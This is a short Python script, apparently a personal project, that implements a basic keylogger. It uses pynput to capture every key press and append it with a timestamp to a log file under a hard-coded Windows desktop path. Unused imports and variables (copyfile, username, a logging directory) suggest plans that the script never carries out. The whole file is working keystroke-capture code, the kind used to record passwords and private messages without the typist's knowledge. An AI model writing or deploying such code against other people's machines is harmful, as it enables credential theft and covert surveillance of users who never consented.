from pynput.keyboard import listener, Listener
import os
import logging
from shutil import copyfile

username = os.getlogin()
logging_directory = f"c:/Users/rhysa/Desktop"

logging.basicConfig(filename=f"C:/Users/rhysa/Desktop/Python/Logging/log.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def key_handler(key):
    logging.info(key)

with Listener(on_press=key_handler) as listener:
    listener.join()



